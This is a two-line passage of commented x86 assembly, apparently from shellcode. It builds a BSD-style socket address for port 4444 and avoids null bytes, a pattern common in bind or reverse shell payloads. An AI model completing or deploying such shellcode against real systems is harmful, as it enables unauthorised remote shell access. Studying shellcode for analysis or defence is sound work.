...
; next entry on the stack should be 0x00000000 5c11 02 00

mov esi, 0x5c110201 ; port sin_port=0x115c, sin_family=0x02, sin_len=0x01 (then dec sin_len to 0x00 to avoid null-byte)
